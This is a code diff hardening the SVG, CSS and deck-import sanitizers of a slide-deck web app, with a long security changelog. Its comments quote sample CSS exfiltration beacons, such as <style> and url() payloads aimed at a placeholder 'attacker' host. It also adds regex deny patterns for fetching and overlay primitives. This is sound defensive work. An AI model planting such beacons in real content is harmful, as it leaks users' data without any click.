@@ -135,10 +135,27 @@ const velaClipboardReadSlides = async () => {
   return [];
 };
 
-const VELA_VERSION = "13.19";
+const VELA_VERSION = "13.36";
 const VELA_CHANGELOG = [
-  { v: "13.19", d: ["Security (defense-in-depth): closed a mutation-XSS gap in the deck SVG sanitizer where an event handler could survive on a <style> element, and added layered backstops — a namespace-validity invariant and an output-side re-parse check that rejects any markup a handler/script would survive on the HTML render.", "Desktop shell: the filesystem guard is now frozen and refuses whole-volume, shallow, and OS-critical system roots, further capping file read/write blast radius.", "Regression tests added for all of the above."] },
-  { v: "13.18", d: ["Security (High): hardened the SVG <style>/presentation-attribute CSS filter against a CSS-URL exfil-beacon bypass — external and scheme-relative references are now rejected on token presence rather than on a well-formed match, and at-rules (@import/@font-face) are refused. Closes a zero-click render-time fetch on the host runtimes where the deck sanitizers are the sole backstop.", "Added malformed-input regression tests exercised against the real browser sink."] },
+  { v: "13.36", d: ["CI hardening: the SVG-<style> recurrence guard now scans every part-file (not a hardcoded list that had drifted), forbids built-in prototype tampering that the sanitizer's tag lookup relies on, requires the redress/overlay tests to keep their real assertions, and fails (never skips) if the sanitizer source can't be located. Added a PART_ORDER-completeness guard.", "Housekeeping: added the missing license header to the PPTX export part-file."] },
+  { v: "13.35", d: ["Security (High): the SVG inline style filter now also rejects CSS layout/positioning (position/inset/z-index/pointer-events/viewport-sizing), closing a UI-integrity gap where a positioned SVG element could overlay or clickjack app chrome from a non-clipped diagram panel — the same redress/clickjack class, via the inline-style path rather than the <style> element. SVG paint styling is unaffected.", "CI hardening: security sanitizer regression tests are now un-skippable at runtime (a skip is failed), and the allowlist-tamper guard also catches aliased membership overrides — closing seams where a regression could reach green CI."] },
+  { v: "13.34", d: ["CI hardening: the SVG-<style> exclusion lint now also rejects runtime tampering with the tag allowlist (membership-method override / reassignment), and requires the real-runtime redress regression test to always run (security UI tests can't be marked skippable) — closing two seams where the element could be re-admitted with green CI.", "Test fix: the student-mode teacher-panel tests now navigate to a notes-free slide instead of being AI-gated, restoring real coverage of the panel shell."] },
+  { v: "13.33", d: ["Test integrity: the in-app UI battery now fails a test whose assertion returns false — previously only a thrown error failed a test, so return-based checks (incl. the SVG-<style> redress regression) never failed. Corrected 5 pre-existing tests this surfaced (4 AI-gated, 1 stale selector).", "CI: hardened the SVG-<style> exclusion lint to verify runtime semantics — it now rejects dynamic or escaped allowlist constructions that could re-admit the element past a byte-level check."] },
+  { v: "13.32", d: ["Security (High): the deck SVG sanitizer no longer allows a `<style>` element, closing a UI-integrity gap where document-global CSS could restyle/relocate/re-label the app's own controls (a redress class, escalatable to clickjacking a one-click action). Deck paint uses element-local presentation attributes instead.", "Added a new UI-integrity threat-model invariant, a browser regression test proving deck SVG cannot affect app chrome, and a lint guard preventing re-introduction."] },
+  { v: "13.31", d: "Security (defense-in-depth): unified table-cell Markdown escaping into one complete pass (backslash escaped alongside pipe), resolving a static-analysis incomplete-escaping finding; no behavior change." },
+  { v: "13.30", d: ["Security (defense-in-depth): adversarial review hardened the 13.29 fixes to rock-solid. The dev-server deck listing now refuses to follow a symlinked entry at open time, closing a check/use race rather than relying on a prior path check. Markdown export now applies complete Markdown-context output encoding to every deck-text field at the sink — link/image destinations, reference-style syntax, raw HTML and autolinks, code fences and tables — with matching HTML-stripping of the contributing text fields at import.", "Extensive regression tests added."] },
+  { v: "13.29", d: ["Security (Medium, defense-in-depth): the local dev-server deck listing now enforces the same folder-containment check as every other file endpoint, closing a symlink-escape information disclosure.", "Security (Medium): the local AI channel now requires an authentication token unconditionally and no longer treats a request's Origin as an access boundary, closing an opaque-origin cross-origin access class.", "Security (Low, defense-in-depth): Markdown export now routes deck text through the shared URL-scheme allowlist and Markdown-context output encoding, reaching parity with the live renderer and closing a link/image injection class.", "Regression tests added across all three."] },
+  { v: "13.28", d: ["Security (defense-in-depth): every deck color that reaches a URL-auto-loading CSS sink now passes through the allowlist color encoder (fail-closed), closing a CSS auto-load beacon gap where the ingress denylist was the only guard on a few render sinks.", "CI: a new lint enforces this encoder-gating at every such sink so the pattern can't regress.", "Regression tests added."] },
+  { v: "13.27", d: ["Security (defense-in-depth): brand style sinks are now encoder-gated at render and re-sanitized on load, closing the same class of gap fixed for slide/block styles in 13.26.", "Regression tests added."] },
+  { v: "13.26", d: ["Security (Medium, defense-in-depth): closed a fail-open gap in the deck CSS scrubber where a non-string value on a color/layout key could bypass sanitization and reach a rendered style property; scrubbing is now fail-closed by type.", "Security (defense-in-depth): background/gradient style sinks are now additionally output-encoded at render, and persisted decks are re-sanitized on load, not just on import.", "Regression tests added, including type-fuzzing across the affected fields."] },
+  { v: "13.25", d: ["Security (defense-in-depth): the deck sub-object scrubber now fails closed at its nesting limit — over-deep structures are dropped instead of passed through unscrubbed.", "Security (defense-in-depth): sub-object CSS scrubbing now covers the background/mask/filter property families, matched on a normalized key stem.", "Build: the release bundle's test-hook assertion now matches the test-global naming convention, and the in-bundle UI battery is fenced and runtime-gated like the other test hooks.", "Behavioral regression tests added for all of the above."] },
+  { v: "13.24", d: ["Security (defense-in-depth): deck sub-objects (list items, grid cells, matrix quadrants, comparison points) are now hardened recursively — CSS color/layout/style scrubbing at every level plus dropping the internal-use key namespace.", "Security (defense-in-depth): nested grid-cell block arrays now honor the same per-slide breadth cap.", "Desktop: watcher deck reads are re-checked against the size cap after reading, closing a stat/read race.", "Build: the desktop ship bundle now strips internal test hooks while keeping the production save channel.", "CI: key-drift lint also catches bracket-notation reads; docs state its exact scope.", "Regression tests added across all of the above."] },
+  { v: "13.23", d: "TOC: clicking a slide row then immediately pressing an arrow key no longer loses the keypress — the row's selection now commits synchronously so the following nav lands." },
+  { v: "13.22", d: ["Security (defense-in-depth): deck import now builds slide/block data from an explicit key allowlist instead of copying input, drops an internal-use key namespace at ingress, and bounds recursion depth on nested block structures.", "Security (defense-in-depth): the slide accent custom property stays encoder-gated and CSS type-registered, closing a residual inline-style exfil path.", "Desktop: save writes are now verified by reading the file back, with bounded, size-capped watcher reads.", "Release builds strip internal test hooks from the shipped bundle.", "Security (defense-in-depth): unified the deck-JSON script-injection escaping used by the Python and JS build paths, with a parity test keeping them in sync.", "CI: new drift guards keep the deck key allowlist and the release bundle in sync with the source.", "Regression tests added across all of the above."] },
+  { v: "13.21", d: "Outline (TOC) keyboard nav now moves the shown slide — arrow keys keep one selection cursor in sync with the preview (no freeze after clicking into the outline); collapsed sections navigate section-by-section, landing on each section's first slide." },
+  { v: "13.20", d: ["Gallery now renders section title-card slides as they present.", "TOC: arrow-key collapse/expand for sections, with a current-slide marker on collapsed sections.", "Balanced multi-image paste layouts — side-by-side and grids, up to 5 images per slide; grid images now render at full height instead of collapsing.", "Consistent “AI working” animation across all AI edits, including chat; switching modules no longer flashes the settle on an untouched slide.", "Desktop save reliability: retry/verify with a visible save-status indicator (no more silent stalls)."] },
+  { v: "13.19", d: ["Reorder items inside a block — hover any point/card/step in edit mode and use the ▲▼ arrows (next to delete) to move it up or down. Works across bullets, checklists, grids, timelines, comparisons and more.", "Security (defense-in-depth): closed a mutation-XSS gap in the deck SVG sanitizer where an event handler could survive on a <style> element, and added layered backstops — a namespace-validity invariant and an output-side re-parse check that rejects any markup a handler/script would survive on the HTML render.", "Desktop shell: the filesystem guard is now frozen and refuses whole-volume, shallow, and OS-critical system roots, further capping file read/write blast radius.", "Regression tests added for all of the above."] },
+  { v: "13.18", d: ["Present view now has an Edit toggle (✎ button, or Shift+E) that turns on inline click-to-edit while presenting — off by default so the audience sees a clean slide; resets each time you leave Present.", "Security (High): hardened the SVG <style>/presentation-attribute CSS filter against a CSS-URL exfil-beacon bypass — external and scheme-relative references are now rejected on token presence rather than on a well-formed match, and at-rules (@import/@font-face) are refused. Closes a zero-click render-time fetch on the host runtimes where the deck sanitizers are the sole backstop.", "Added malformed-input regression tests exercised against the real browser sink."] },
   { v: "13.17", d: "Ctrl/⌘-click a section's collapse arrow in the list to collapse or expand every section at once — plain click still toggles just that one section." },
   { v: "13.16", d: "Fixed a race where opening/reloading a deck appended a spurious empty \u201CNew section\u201D each time — the empty-deck seed no longer fires against a deck that is still loading." },
   { v: "13.15", d: "Move a slide/selection to another section with Ctrl/⌘-click on the destination to move it \u201Cout\u201D while keeping focus in the current section on the next slide (or the first slide of the following section when you move the last one) — plain click still follows the slide into its new section." },
@@ -362,7 +379,7 @@ function applyStartupPatch(loadedDeck, dispatch) {
     dbg("[PATCH] Full deck replace");
     try {
       const sanitized = validateAndSanitizeDeck(STARTUP_PATCH);
-      dispatch({ type: "LOAD", payload: { ...sanitized, deckTitle: STARTUP_PATCH.deckTitle || "Untitled" } });
+      dispatch({ type: "LOAD", payload: { ...sanitized, deckTitle: sanitizeDeckTitle(STARTUP_PATCH.deckTitle) } });
     } catch (e) {
       // Fail closed: never load an unsanitized deck. validateAndSanitizeDeck only throws
       // on fundamentally invalid input (not an object / no lanes array) now that the
@@ -461,6 +478,17 @@ function sanitizeString(val, maxLen = 500) {
   return out.replace(/<(?=[a-zA-Z!/])/g, "").slice(0, maxLen);
 }
 
+// deckTitle is re-assigned raw (not run through sanitizeString) at a handful of
+// merge/import/patch call sites — it only ever reaches ESCAPED text sinks (React
+// text nodes, the browser tab title, an exported filename that's already
+// character-filtered), so there is no XSS here. But it is neither type- nor
+// length-clamped at those sites, so a non-string or absurdly long value could
+// still ride into state/storage. Small robustness coercion: always a string,
+// capped to a sane title length. (v13.26, F-12)
+function sanitizeDeckTitle(t) {
+  return String(t == null ? "" : t).slice(0, 200) || "Untitled";
+}
+
 function sanitizeUrl(url, allowedProtocols = ["http:", "https:", "mailto:"]) {
   if (typeof url !== "string") return "";
   const trimmed = url.trim();
@@ -537,7 +565,16 @@ const SVG_ALLOWED_TAGS = new Set([
   // common-but-needs-care (each has explicit attribute filtering downstream)
   "a",      // href passes scheme allowlist
   "image",  // href/xlink:href pass scheme allowlist
-  "style",  // textContent passes isSvgStyleSafe; walk descends to strip CDATA/comment/PI
+  // SECURITY: <style> is deliberately NOT allowed. An inline <style> injected via
+  // dangerouslySetInnerHTML applies DOCUMENT-GLOBAL CSS (the cascade is not scoped
+  // to the SVG subtree), so deck-supplied selectors + declarations could restyle,
+  // hide, relocate, or re-label the trusted application UI — i.e. redress and
+  // clickjack real controls. A deck value must never alter the presentation,
+  // geometry, hit-testing, or labeling of app chrome (UI-integrity invariant).
+  // Legitimate deck paint needs only presentation attributes (fill="url(#id)",
+  // gradients, markers), which remain allowed and validated. isSvgStyleSafe (below)
+  // is retained for the inline style="" attribute and url-ref presentation
+  // attributes, whose reach is element-local, not cascade-global.
 ]);
 
 // SVG attributes whose value can carry a functional URL reference that the
@@ -551,13 +588,16 @@ const SVG_URL_REF_ATTRS = new Set([
   "marker", "marker-start", "marker-mid", "marker-end", "cursor", "color-profile",
 ]);
 
-// SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
-// attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
-// render — zero-click exfil beacon with no CSP backstop inside the artifact
-// srcdoc. SAFE_STYLE_KEYS only filters the style="..." inline attribute, not
-// <style>-element CSS text. We allow url(#fragment) (SVG paint servers,
-// markers, gradients, clip-paths) and reject everything else that can hit
-// the network or use legacy code-execution constructs. CSS \XX escape
+// SVG CSS-value filter for the inline style="" attribute and url-ref
+// presentation attributes (fill/stroke/filter/mask/clip-path/marker/cursor).
+// The <style> ELEMENT is no longer allowed (see SVG_ALLOWED_TAGS) — a
+// document-global stylesheet is dropped outright, not filtered — so this guards
+// only element-local CSS values. The threat here: a value like
+// background:url("https://attacker/?d=...") or image-set("https://…") fires an
+// outbound GET on render — a zero-click exfil beacon with no CSP backstop inside
+// the artifact srcdoc. We allow url(#fragment) (SVG paint servers, markers,
+// gradients, clip-paths) and reject everything else that can hit the network or
+// use legacy code-execution constructs. CSS \XX escape
 // sequences can decode "url" / "@import" past a literal-token regex
 // (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
 // Also reject any '<' or ']]>' — defense-in-depth against rawtext-breakout
@@ -604,6 +644,18 @@ function isSvgStyleSafe(css) {
   // image-set() bypass of the v12.53 url() exfil fix.
   const fnStr = css.match(/[a-z][\w-]*\s*\(\s*['"]/gi);
   if (fnStr && fnStr.some((m) => !/^url\s*\(/i.test(m))) return false;
+  // UI-integrity: reject CSS layout/positioning properties. SVG paint via inline
+  // style is fine (fill/stroke/opacity/stroke-width/…), but position/inset/z-index/
+  // pointer-events let a deck element ESCAPE its container and overlay, hide, or
+  // clickjack the trusted app UI — the render sinks in the study-notes / teacher
+  // diagram panels are NOT inside a transform+overflow-hidden containing block, so a
+  // fixed-positioned SVG element reaches whole-app chrome. This mirrors the exclusion
+  // SAFE_STYLE_KEYS already enforces for block.style; the SVG inline-style path (and
+  // the presentation-attr values that share this filter) must consult the same bar.
+  if (/(?:^|[;{}\s])(?:position|top|left|right|bottom|inset(?:-block|-inline)?(?:-start|-end)?|z-index|pointer-events)\s*:/i.test(css)) return false;
+  // Viewport-relative sizing is itself an overlay primitive (a 100vw×100vh element);
+  // legit SVG paint never needs it.
+  if (/\b[\d.]+(?:vw|vh|vmin|vmax|vi|vb|dvw|dvh|dvi|dvb|svw|svh|lvw|lvh|cqw|cqh|cqi|cqb)\b/i.test(css)) return false;
   return true;
 }
 
@@ -654,21 +706,11 @@ function sanitizeSvgMarkup(raw) {
           // differently at the HTML dangerouslySetInnerHTML sink. Drop anything
           // outside the SVG namespace. Mirrors DOMPurify's _checkValidNamespace.
           if (child.namespaceURI !== "http://www.w3.org/2000/svg") { child.remove(); continue; }
-          if (tag === "style") {
-            if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
-            // SECURITY: strip EVERY attribute from <style> — do NOT skip the
-            // attribute pass. <style> is a common SVG/HTML element, so on the
-            // dangerouslySetInnerHTML HTML re-parse any surviving handler goes
-            // live (mutation-XSS). Legitimate SVG <style> needs no attribute we
-            // keep (type/media are inert and optional), so drop them all
-            // uniformly rather than trusting an element-specific shortcut. (v13.19)
-            for (const a of Array.from(child.attributes)) child.removeAttribute(a.name);
-            // Still descend so the nodeType filter above strips any CDATA/comment/PI
-            // children. CDATA serializes literally and a smuggled `</style>` inside
-            // it escapes rawtext when re-parsed as HTML, yielding a live handler.
-            walk(child);
-            continue;
-          }
+          // <style> is not in SVG_ALLOWED_TAGS (removed at the allowlist check
+          // above) — an inline stylesheet is document-global, not SVG-scoped, so
+          // it is dropped outright rather than filtered. isSvgStyleSafe still runs
+          // on the inline style="" attribute and url-ref attrs (element-local reach)
+          // in the attribute pass below.
           const attrs = Array.from(child.attributes);
           for (const a of attrs) {
             const name = a.name.toLowerCase();
@@ -835,13 +877,42 @@ function sanitizeStyle(style) {
 // and block.style share ONE filter and can't drift apart. bgImage (a background
 // *image*) is clamped to data:image/* separately, like the image block / logo.
 const CSS_COLOR_KEY = /^(bg|color|accent|fill|stroke|border)$|(Color|Bg|Border|Gradient|Fill|Stroke)$/;
-function scrubColorFields(obj) {
+// Shared body for all three key-pattern scrubbers below: a KEY that names a CSS
+// property must carry a STRING or a finite NUMBER — any other shape is
+// out-of-schema for a CSS scalar and is DELETED, never passed through. This is
+// the fail-CLOSED contract: "produce a value of the declared type, or nothing".
+// A matched key whose value is a string still runs the dangerous-primitive/length
+// check below; a finite number is inherently safe (it can never carry a `url(`
+// token) and is let through unchanged — several of these SAME key names
+// (block.gap/height/spacing/maxWidth, slide.gap pre-clamped by
+// SLIDE_NUMERIC_BOUNDS) are legitimately plain numeric px values, mirroring how
+// sanitizeStyle's own numeric branch already treats style numbers. Every OTHER
+// non-string shape (array, boxed String, {toString}/{valueOf} object, boolean,
+// NaN/Infinity, plain object) is deleted outright, because every one of those
+// shapes reaches the same raw CSS sink downstream (React coerces a non-string,
+// non-number style value with `'' + value`, running any custom toString/valueOf)
+// and the denylist regex below only inspects real strings.
+// Previously a non-string on a matched key was skipped (`continue`), which let
+// an array/object payload on an allowlisted key (bg, bgGradient, …) ride through
+// untouched into `style.background`, a zero-click CSS exfil beacon on render —
+// the denylist was never even consulted for that shape. Inverting the skip into
+// a delete (while still admitting the one other genuinely-safe primitive type)
+// closes the whole family in one place: it cannot matter what future non-string,
+// non-number shape an attacker invents, only string/number values ever reach
+// render. One value filter, three key patterns — so the surfaces cannot drift
+// apart as they did when each carried its own copy. (v13.26)
+function scrubCssFields(obj, keyMatches) {
   if (!obj || typeof obj !== "object") return;
   for (const k of Object.keys(obj)) {
+    if (!keyMatches(k)) continue;
     const v = obj[k];
-    if (typeof v !== "string" || !CSS_COLOR_KEY.test(k)) continue;
+    if (typeof v === "number") { if (!Number.isFinite(v)) delete obj[k]; continue; }
+    if (typeof v !== "string") { delete obj[k]; continue; }
     if (v.length > 500 || STYLE_VALUE_REJECT.test(v)) delete obj[k];
   }
+}
+function scrubColorFields(obj) {
+  scrubCssFields(obj, (k) => CSS_COLOR_KEY.test(k));
 }
 
 // Companion to scrubColorFields for the non-color LAYOUT/SIZING scalars that a
@@ -854,11 +925,102 @@ function scrubColorFields(obj) {
 // this is feature-transparent. (v12.71)
 const CSS_LAYOUT_KEY = /^(padding|margin|gap|spacing|borderRadius|borderWidth|maxWidth|maxHeight|minWidth|minHeight|width|height|inset|top|left|right|bottom)$/;
 function scrubLayoutFields(obj) {
+  scrubCssFields(obj, (k) => CSS_LAYOUT_KEY.test(k));
+}
+
+// SECURITY (sub-object PAINT keys): CSS_COLOR_KEY keys off the names Vela's own
+// schema uses, which is sound for the allowlisted top-level slide/block objects
+// — a key outside the allowlist cannot exist there at all. Raw-spread SUB-objects
+// keep whatever key a deck invents, so they additionally need the CSS property
+// families that FETCH: background / mask / filter / cursor and friends, where
+// url() is the canonical auto-load channel. Matched on a normalized stem
+// (lowercased, letters only, vendor prefix dropped) so background-image,
+// backgroundImage, bgImage and WebkitMaskImage all reduce to one test.
+//
+// Applied ONLY through scrubSubObject, never at the top level: `bgImage` is a
+// real slide field carrying a long data: URI that sanitizeSlide validates on its
+// own, so pattern-scrubbing it here would strip legitimate slide backgrounds.
+// `content` is deliberately absent — it is a documented TEXT field
+// (SAFE_BLOCK_KEYS), not a CSS sink, and prose may legitimately carry a URL. (v13.25)
+const CSS_PAINT_KEY = /^(bg|background|mask|filter|backdropfilter|clippath|cursor|liststyle|borderimage|shapeoutside|offsetpath|boxshadow|textshadow|behavior|binding)/;
+const cssKeyStem = (k) => k.toLowerCase().replace(/[^a-z]/g, "").replace(/^(webkit|moz|ms|epub)/, "");
+function scrubPaintFields(obj) {
+  scrubCssFields(obj, (k) => CSS_PAINT_KEY.test(cssKeyStem(k)));
+}
+
+// VELA:DEV-ONLY:BEGIN
+// SECURITY (test surface): the SINGLE gate for every in-app test affordance —
+// the window hooks (part-app.jsx), the headless battery entry point and its
+// Ctrl+Alt+T / custom-event triggers (part-uitest.jsx), and the render battery
+// (part-test.jsx). Test code installs only in local/desktop mode, or when a
+// harness opts in by setting window.__velaTestMode BEFORE boot (vela-drive.js
+// does this via addInitScript). A hosted artifact satisfies neither, so no
+// panel mounts, no listener or keyboard shortcut is registered, and no global
+// is written — there is nothing left to reach.
+//
+// ONE predicate on purpose: three hand-copied conditions is exactly how the
+// scrubber surfaces drifted apart. Every caller sits inside a DEV-ONLY fence,
+// so `concat.py --release` removes the gate and its callers together and the
+// release bundle carries no reference to the test-mode flag at all. (v13.25)
+function velaTestSurfaceEnabled() {
+  return !!(VELA_LOCAL_MODE || (typeof window !== "undefined" && window.__velaTestMode));
+}
+// VELA:DEV-ONLY:END
+
+// SECURITY (deck sub-object ingress): the top-level slide/block objects are
+// rebuilt from a hardcoded key ALLOWLIST, but their nested SUB-OBJECTS — list
+// `items`, grid cells (`cell`), matrix `quadrants`, comparison sides and their
+// nested points — are copied by raw object spread and therefore keep arbitrary
+// keys. Their safety rests on the pattern scrubbers, so run those on EVERY
+// nested object (not just the first level) and additionally drop the reserved
+// `_`-prefixed private namespace so a deck cannot forge a renderer-private flag
+// on a sub-object either. We deliberately do NOT allowlist sub-object keys: the
+// ~14 item shapes read wildly different key sets (see the renderer inventory),
+// so an allowlist risks silently dropping a legitimate rendered key. The
+// scrubbers only delete a color/layout/style VALUE that is dangerous, never a
+// renderer key, so this closes the surface without a rendering blast radius.
+// The cap FAILS CLOSED: at the limit the over-deep subtree is DELETED, never
+// returned unvisited. A depth guard that simply `return`s hands the attacker the
+// switch — nesting one level past the cap is all it takes to opt out of the very
+// scrubbers this function exists to guarantee, which is the classic
+// strip-and-return recursive-filter bypass. Dropping instead keeps the invariant
+// the callers rely on: every object still present here has been scrubbed. The
+// sibling caps in this file (MAX_BLOCK_DEPTH, the breadth slices) drop too, and
+// renderers read sub-objects at depth 1–3, so the limit is unreachable by real
+// authored content.
+//
+// BUDGET: this counts SUB-OBJECT hops, not block levels, and a legitimately
+// nested grid spends ~4 per block level (items array → cell → blocks array →
+// block). MAX_BLOCK_DEPTH already caps block nesting and fails closed, so the
+// real ceiling for authored content is ~4×MAX_BLOCK_DEPTH; the value below
+// clears that with headroom while still bounding recursion. Sizing it to the
+// renderer read-depth instead would truncate valid deeply-gridded decks — the
+// guard must fail closed on hostile input without eating real content. (v13.25)
+const MAX_SUBOBJECT_DEPTH = 32;
+function scrubSubObject(obj, depth = 0) {
   if (!obj || typeof obj !== "object") return;
+  if (Array.isArray(obj)) {
+    if (depth >= MAX_SUBOBJECT_DEPTH) { obj.length = 0; return; }
+    for (const el of obj) scrubSubObject(el, depth + 1);
+    return;
+  }
+  // Drop the reserved renderer-private namespace: internal flags are set by our
+  // own code AFTER sanitization, never carried in from a deck.
+  for (const k of Object.keys(obj)) {
+    if (k.charCodeAt(0) === 95 /* "_" */) delete obj[k];
+  }
+  if ("style" in obj) {
+    const s = sanitizeStyle(obj.style);
+    if (s && Object.keys(s).length) obj.style = s; else delete obj.style;
+  }
+  scrubColorFields(obj);
+  scrubPaintFields(obj);
+  scrubLayoutFields(obj);
   for (const k of Object.keys(obj)) {
     const v = obj[k];
-    if (typeof v !== "string" || !CSS_LAYOUT_KEY.test(k)) continue;
-    if (v.length > 500 || STYLE_VALUE_REJECT.test(v)) delete obj[k];
+    if (!v || typeof v !== "object") continue;
+    if (depth >= MAX_SUBOBJECT_DEPTH) delete obj[k];
+    else scrubSubObject(v, depth + 1);
   }
 }
 
@@ -873,15 +1035,151 @@ function cssUrl(u) {
   return 'url("' + String(u == null ? "" : u).replace(/[\\"]/g, "\\$&").replace(/[\n\r\f]/g, "") + '")';
 }
 const CSS_COLOR_OK = /^#[0-9a-f]{3,8}$|^(?:rgb|rgba|hsl|hsla)\([0-9.,%\s/]+\)$|^[a-z]+$/i;
+// Fail-closed on TYPE first (v13.26): `String(c)` coerces ANY shape to a string
+// before the allowlist test, and a single-element array (`String(["red"])` ===
+// "red") or a {toString}/{valueOf} gadget would satisfy CSS_COLOR_OK exactly
+// the way a plain string would — the same type-confusion root cause as F-1,
+// just re-entering through the encoder instead of the scrubber. Reject any
+// non-string outright so this defense-in-depth gate can't be bypassed by shape.
 function cssColor(c) {
-  const v = String(c == null ? "" : c).trim();
+  if (typeof c !== "string") return "";
+  const v = c.trim();
   return (CSS_COLOR_OK.test(v) && !/url\(|\/\*|[<>]/i.test(v)) ? v : "";
 }
+// cssColor has no gradient-function alternative (a gradient is legitimately its
+// own grammar, not a color token), so slide.bgGradient needs a sibling encoder
+// rather than a weakened cssColor. Structural allowlist: only the three gradient
+// function names, only the charset a color-stop list can legitimately contain
+// (hex/rgb/hsl color tokens, numbers, %, deg, commas, the "to"/"at"/side/corner/
+// shape keywords, nested parens for rgba(...) stops). That charset alone still
+// contains every letter, so `url(` or `expression(` would satisfy it — the
+// canonical STYLE_VALUE_REJECT denylist (shared with scrubCssFields) is the
+// actual gate against those; the structural allowlist's job is only to reject
+// stray punctuation (quotes, semicolons, braces, backslashes) a fetching/
+// breakout primitive would need but a real gradient never does. (v13.26)
+const CSS_GRADIENT_OK = /^(?:repeating-)?(?:linear|radial|conic)-gradient\([a-zA-Z0-9#.,%\s()-]*\)$/;
+// Fail-closed on TYPE first — see cssColor above for why: a coercing `String(g)`
+// would let a single-element array or {toString} gadget satisfy the structural
+// allowlist exactly like a real string does. (v13.26)
+function cssGradient(g) {
+  if (typeof g !== "string") return "";
+  const v = g.trim();
+  if (!v || v.length > 500) return "";
+  return (CSS_GRADIENT_OK.test(v) && !STYLE_VALUE_REJECT.test(v)) ? v : "";
+}
 
-function sanitizeBlock(block) {
+// ━━━ Deck-ingress key allowlists ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// SECURITY (deck ingress): sanitizeSlide/sanitizeBlock used to start from a
+// wholesale copy of the caller's object, so ANY key an untrusted deck (file,
+// clipboard, startup patch, Vera tool result) chose rode into app state, was
+// persisted, and was handed to every renderer/exporter downstream. Ingress is
+// now an ALLOWLIST — same shape as SAFE_STYLE_KEYS for style objects: only the
+// keys below are copied, everything else is dropped. This keeps the attack
+// surface equal to the set of fields the app actually reads.
+//
+// The `_` prefix is a RESERVED renderer-private namespace. Internal flags
+// (_gridCell, _solo, _virtual, and any future one) are set by our own code
+// AFTER sanitization; a deck must never be able to forge one and pin itself
+// into a layout branch the author never selected. Neither set therefore holds
+// a `_` key, and building from the allowlist drops them by construction.
+//
+// MAINTENANCE: these two sets are the single source of truth for the key-drift
+// check in tools/vela-dev/scripts/lint.py, which fails the build when
+// part-blocks.jsx / part-slides.jsx read a slide.<key> or block.<key> that is
+// not listed (or `_`-prefixed). Adding a renderer feature means adding its key
+// here in the same change.
+const SAFE_SLIDE_KEYS = new Set([
+  // content
+  "blocks", "L", "R", "layout",
+  // legacy top-level content fields (pre-block decks; still sanitized above)
+  "title", "subtitle", "quote", "author", "bullets",
+  // theme / background
+  "bg", "bgGradient", "bgImage", "color", "mutedColor", "accent",
+  // layout & spacing
+  "align", "verticalAlign", "padding", "gap",
+  "splitGap", "contentFlex", "imageFlex", "imageCols",
+  // presentation metadata
+  "duration", "timeLock", "hidden", "notes", "speakerNotes", "studyNotes",
+  "comments", "image",
+]);
+const SAFE_BLOCK_KEYS = new Set([
+  // identity / shared. NOTE: `blocks` is deliberately absent — only a GRID CELL
+  // carries a blocks array (handled by the grid branch below), never a block
+  // itself, so `blocks` is a slide-only key (see SLIDE_ONLY_KEYS in part-engine).
+  "type", "hidden", "style", "link", "items", "quadrants",
+  "text", "content", "title", "label", "value", "name", "caption", "author",
+  // typography
+  "size", "align", "weight", "bold", "italic",
+  "titleSize", "textSize", "labelSize", "sublabelSize", "captionSize",
+  // color
+  "color", "bg", "border", "borderColor", "titleColor", "textColor",
+  "labelColor", "sublabelColor", "captionColor", "dateColor", "dotColor",
+  "lineColor", "numberColor", "trackColor", "cellColor", "headerBg",
+  "headerColor", "arrowColor", "gateColor", "loopColor", "annotationColor",
+  "iconColor", "iconBg",
+  // box / spacing
+  "gap", "padding", "spacing", "maxWidth", "maxHeight", "height", "h",
+  "rounded", "shadow", "bordered", "compact", "striped", "hideDivider",
+  // media
+  "src", "alt", "fit", "markup",
+  // code
+  "lang", "copy",
+  // icon
+  "icon", "iconShape", "circle", "strokeWidth",
+  // table
+  "headers", "rows", "cols",
+  // flow / steps / timeline / cycle
+  "direction", "connectorStyle", "activeStep",
+  "gateIcon", "gateLabel", "loop", "loopLabel", "loopStyle",
+  "centerLabel", "centerSub",
+  // progress
+  "showValue", "showIcons", "showLabels", "annotation",
+  "leftLabel", "rightLabel", "leftIcon", "rightIcon",
+  // comparison / matrix
+  "dividerLabel", "variant", "xLeft", "xRight", "yTop", "yBottom",
+  // callout
+  "reveal",
+]);
+
+// Numeric slide fields: key → [min, max, integer?]. Deck input is coerced to a
+// finite number and clamped; anything else (NaN, Infinity, "3; x", objects) is
+// dropped so it can never reach a layout/CSS sink as an arbitrary token. The
+// bounds are layout-sanity limits taken from how the renderer consumes each on
+// the 960×540 canvas:
+//   imageCols             — CSS grid track count for a run of adjacent images
+//                           (1..6 cells across; beyond that a cell is unreadable)
+//   gap / splitGap        — px gap between blocks / between columns (0..200 of 540)
+//   contentFlex/imageFlex — flex-grow ratio of the two columns (0.1..20)
+const SLIDE_NUMERIC_BOUNDS = {
+  imageCols: [1, 6, true],
+  gap: [0, 200, false],
+  splitGap: [0, 200, false],
+  contentFlex: [0.1, 20, false],
+  imageFlex: [0.1, 20, false],
+};
+function clampDeckNumber(v, min, max, isInt) {
+  const n = typeof v === "number" ? v
+    : (typeof v === "string" && v.trim() !== "" ? Number(v) : NaN);
+  if (!Number.isFinite(n)) return undefined;
+  const c = Math.min(max, Math.max(min, n));
+  return isInt ? Math.round(c) : c;
+}
+
+// Nesting cap for grid → items[].blocks[] recursion. A deck is a data file, so a
+// deeply self-nested structure is never authored content — it is a cheap way to
+// blow the stack (or the render tree) at load. Blocks deeper than this are dropped.
+const MAX_BLOCK_DEPTH = 4;
+
+function sanitizeBlock(block, depth = 0) {
   if (!block || typeof block !== "object" || Array.isArray(block)) return null;
   if (!SAFE_BLOCK_TYPES.has(block.type)) return null;
-  const clean = { ...block };
+  if (depth > MAX_BLOCK_DEPTH) return null;
+  // Allowlist copy (see SAFE_BLOCK_KEYS): unknown and `_`-prefixed keys never
+  // enter `clean`, so the rest of this function only ever sees known fields.
+  const clean = {};
+  for (const k of SAFE_BLOCK_KEYS) {
+    if (Object.prototype.hasOwnProperty.call(block, k)) clean[k] = block[k];
+  }
   // `hidden` (element visibility toggle) — coerce to a strict boolean so a
   // non-boolean value can never reach layout/render logic.
   if ("hidden" in clean) { if (clean.hidden === true) clean.hidden = true; else delete clean.hidden; }
@@ -892,6 +1190,14 @@ function sanitizeBlock(block) {
   if (clean.author) clean.author = sanitizeString(clean.author, 200);
